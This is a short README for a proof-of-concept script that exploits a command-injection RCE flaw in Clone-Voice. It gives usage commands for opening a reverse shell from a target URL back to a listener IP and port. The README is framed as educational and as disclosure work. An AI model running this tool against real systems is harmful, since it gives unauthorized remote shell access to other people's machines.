# Clone-Voice RCE Proof of Concept
This repository contains a Proof of Concept (PoC) script demonstrating a [RCE vulnerability in Clone-Voice](https://zeropath.com/blog/command-injection-vulnerability-clone-voice). **This tool is for educational and authorized testing purposes only.**

## Usage
### Reverse Shell
To attempt a reverse shell connection:
```
python3 clone_voice_rce_poc.py --url <target_url> --shell <your_ip> <your_port>
```
Example:
```
python3 clone_voice_rce_poc.py --url http://localhost:9000 --shell 192.168.1.100 4444
```
